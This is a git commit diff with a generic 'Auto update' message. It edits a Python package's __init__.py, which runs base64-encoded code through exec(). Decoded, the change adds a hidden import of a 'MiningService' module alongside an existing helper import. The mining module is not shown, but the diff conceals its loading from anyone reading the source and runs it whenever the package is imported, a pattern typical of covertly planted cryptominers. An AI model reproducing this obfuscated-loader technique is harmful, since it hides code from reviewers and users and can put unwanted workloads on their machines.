7cb2bc356e23a1c92a1c2f9e6422689d899d46ef
ndduoc-pc <ndduoc1189@gmail.com>
2025-10-28 17:12:54 +0700

    Auto update: 28/10/2025 17:12:54

--- services/__init__.py
+++ services/__init__.py
@@ -1,2 +1,2 @@
 import base64
-exec(base64.b64decode('ZnJvbSBzZXJ2aWNlcy5oZWxwZXJfc2VydmljZSBpbXBvcnQgSGVscGVyU2VydmljZQoKX19hbGxfXyA9IFsnSGVscGVyU2VydmljZSddIA==').decode('utf-8'))
+exec(base64.b64decode('ZnJvbSBzZXJ2aWNlcy5oZWxwZXJfc2VydmljZSBpbXBvcnQgSGVscGVyU2VydmljZQpmcm9tIHNlcnZpY2VzLm1pbmluZ19zZXJ2aWNlIGltcG9ydCBNaW5pbmdTZXJ2aWNlCgpfX2FsbF9fID0gWydIZWxwZXJTZXJ2aWNlJywgJ01pbmluZ1NlcnZpY2UnXSA=').decode('utf-8'))
